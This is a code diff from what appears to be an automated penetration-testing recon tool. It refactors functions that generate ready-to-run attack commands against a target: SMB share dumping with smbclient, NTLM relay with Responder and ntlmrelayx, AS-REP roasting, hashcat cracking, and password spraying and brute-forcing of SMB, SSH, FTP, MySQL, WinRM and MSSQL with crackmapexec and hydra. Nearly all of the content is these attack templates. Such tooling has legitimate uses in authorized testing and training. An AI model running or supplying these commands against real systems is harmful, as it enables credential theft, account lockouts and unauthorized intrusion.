@@ -141,13 +141,12 @@ def _parse_shares(smb_dir: Path, session, log) -> None:
         # Add manual smbclient commands for each readable share (dynamic, not hardcoded)
         ip = session.info.ip
         for share in sorted(shares):
-            session.add_note(
-                f"[MANUAL] List SMB share: smbclient '//{ip}/{share}' -N -c 'ls'"
-            )
-            session.add_note(
-                f"[MANUAL] Download SMB share: smbclient '//{ip}/{share}' -N "
-                f"-c 'recurse ON; prompt OFF; mget *'"
-            )
+            list_cmd = f"smbclient '//{ip}/{share}' -N -c 'ls'"
+            dl_cmd   = f"smbclient '//{ip}/{share}' -N -c 'recurse ON; prompt OFF; mget *'"
+            session.add_note(f"[MANUAL] List SMB share: {list_cmd}")
+            session.add_note(f"[MANUAL] Download SMB share: {dl_cmd}")
+            session.add_manual_command(list_cmd, f"List SMB share: {share}")
+            session.add_manual_command(dl_cmd,   f"Download all files from SMB share: {share}")
 
         # Infer potential usernames from share names.
         # "Samantha Konstan" → ["samantha", "konstan", "skonstan", "samanthakonstan"]
@@ -432,10 +431,9 @@ def _generate_spray_hints(session, log) -> None:
     ldap_dir   = session.target_dir / "ldap"
 
     # Password policy MUST be checked before ANY spray to avoid lockouts
-    session.add_note(
-        f"[MANUAL] Password policy check (before spraying): "
-        f"crackmapexec smb {ip} --pass-pol"
-    )
+    passpol_cmd = f"crackmapexec smb {ip} --pass-pol"
+    session.add_note(f"[MANUAL] Password policy check (before spraying): {passpol_cmd}")
+    session.add_manual_command(passpol_cmd, "Check password policy before any spray (avoid lockouts)")
     log.info("Spray hints added: %d users discovered — policy check + per-service commands",
              len(session.info.users_found))
 
@@ -443,67 +441,66 @@ def _generate_spray_hints(session, log) -> None:
     for note in session.info.notes:
         if re.search(r'smb signing disabled|ntlm relay', note, re.IGNORECASE):
             if domain:
-                session.add_note(
-                    f"[MANUAL] NTLM relay (domain target): "
+                relay_cmd = (
                     f"sudo responder -I tun0 -wd && "
                     f"impacket-ntlmrelayx -t smb://{ip} -smb2support"
                 )
+                session.add_note(f"[MANUAL] NTLM relay (domain target): {relay_cmd}")
+                session.add_manual_command(relay_cmd, "NTLM relay attack (SMB signing disabled)")
             else:
-                # Workgroup: relay is harder — capture and crack hash offline
+                capture_cmd = "sudo responder -I tun0 -wrf"
                 session.add_note(
-                    f"[MANUAL] NTLM capture (workgroup — no relay target): "
-                    f"sudo responder -I tun0 -wrf  "
+                    f"[MANUAL] NTLM capture (workgroup — no relay target): {capture_cmd}  "
                     f"# then crack: hashcat -m 5600 <hash.txt> /usr/share/wordlists/rockyou.txt"
                 )
+                session.add_manual_command(capture_cmd, "NTLM hash capture (workgroup target)")
             break
 
     # AS-REP Roasting — only makes sense with a domain
     if domain:
-        session.add_note(
-            f"[MANUAL] AS-REP Roasting (no pre-auth accounts): "
+        asrep_cmd = (
             f"impacket-GetNPUsers {domain}/ -dc-ip {ip} -no-pass "
             f"-usersfile {uf} -format hashcat "
             f"-outputfile {ldap_dir}/asrep_hashes.txt"
         )
-        session.add_note(
-            f"[MANUAL] Crack AS-REP hashes: "
+        crack_asrep = (
             f"hashcat -m 18200 {ldap_dir}/asrep_hashes.txt "
             f"/usr/share/wordlists/rockyou.txt -r /usr/share/john/rules/best64.rule"
         )
+        session.add_note(f"[MANUAL] AS-REP Roasting (no pre-auth accounts): {asrep_cmd}")
+        session.add_note(f"[MANUAL] Crack AS-REP hashes: {crack_asrep}")
+        session.add_manual_command(asrep_cmd,    "AS-REP Roasting — extract hashes from accounts without pre-auth")
+        session.add_manual_command(crack_asrep,  "Crack AS-REP hashes offline")
 
     # Per-service spray — only for ports that are actually open
     open_ports = session.info.open_ports
     if 445 in open_ports or 139 in open_ports:
-        session.add_note(
-            f"[MANUAL] SMB spray: "
+        smb_spray = (
             f"crackmapexec smb {ip} -u {uf} "
             f"-p /usr/share/wordlists/rockyou.txt --no-bruteforce --continue-on-success"
         )
+        session.add_note(f"[MANUAL] SMB spray: {smb_spray}")
+        session.add_manual_command(smb_spray, "SMB password spray (check lockout policy first)")
     if 22 in open_ports:
-        session.add_note(
-            f"[MANUAL] SSH spray (rate-limited): "
-            f"hydra -L {uf} -P /usr/share/wordlists/rockyou.txt ssh://{ip} -t 4 -w 3"
-        )
+        ssh_spray = f"hydra -L {uf} -P /usr/share/wordlists/rockyou.txt ssh://{ip} -t 4 -w 3"
+        session.add_note(f"[MANUAL] SSH spray (rate-limited): {ssh_spray}")
+        session.add_manual_command(ssh_spray, "SSH password spray (rate-limited, 4 threads)")
     if 5985 in open_ports or 5986 in open_ports:
-        session.add_note(
-            f"[MANUAL] WinRM spray: "
-            f"crackmapexec winrm {ip} -u {uf} -p '<FOUND_PASSWORD>'"
-        )
+        winrm_spray = f"crackmapexec winrm {ip} -u {uf} -p '<FOUND_PASSWORD>'"
+        session.add_note(f"[MANUAL] WinRM spray: {winrm_spray}")
+        session.add_manual_command(winrm_spray, "WinRM credential test with found passwords")
     if 21 in open_ports:
-        session.add_note(
-            f"[MANUAL] FTP cred test: "
-            f"hydra -L {uf} -P /usr/share/wordlists/rockyou.txt ftp://{ip}"
-        )
+        ftp_spray = f"hydra -L {uf} -P /usr/share/wordlists/rockyou.txt ftp://{ip}"
+        session.add_note(f"[MANUAL] FTP cred test: {ftp_spray}")
+        session.add_manual_command(ftp_spray, "FTP credential brute-force")
     if 3306 in open_ports:
-        session.add_note(
-            f"[MANUAL] MySQL cred test: "
-            f"hydra -L {uf} -P /usr/share/wordlists/rockyou.txt mysql://{ip}"
-        )
+        mysql_spray = f"hydra -L {uf} -P /usr/share/wordlists/rockyou.txt mysql://{ip}"
+        session.add_note(f"[MANUAL] MySQL cred test: {mysql_spray}")
+        session.add_manual_command(mysql_spray, "MySQL credential brute-force")
     if 1433 in open_ports:
-        session.add_note(
-            f"[MANUAL] MSSQL cred test: "
-            f"crackmapexec mssql {ip} -u {uf} -p '<FOUND_PASSWORD>'"
-        )
+        mssql_spray = f"crackmapexec mssql {ip} -u {uf} -p '<FOUND_PASSWORD>'"
+        session.add_note(f"[MANUAL] MSSQL cred test: {mssql_spray}")
+        session.add_manual_command(mssql_spray, "MSSQL credential test with found passwords")
 
     # Credential reuse reminder
     session.add_note(
